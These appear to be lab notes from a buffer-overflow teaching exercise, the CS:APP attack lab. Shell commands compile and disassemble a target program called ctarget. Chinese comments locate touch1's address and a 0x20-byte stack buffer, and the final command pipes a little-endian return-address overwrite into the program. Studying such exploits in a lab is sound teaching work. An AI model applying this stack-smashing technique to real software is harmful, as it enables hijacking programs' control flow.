gcc -o ctarget ctarget.c
gcc -o hex2raw hex2raw.c
objdump -d ctarget > ctarget.txt
"确定地址touch1的地址0040065e"
“确定test的栈缓冲区空间大小为0x20”
“编辑p1.txt，将地址地址按照小端顺序写入文本”
./hex2raw < p1.txt | ./ctarget
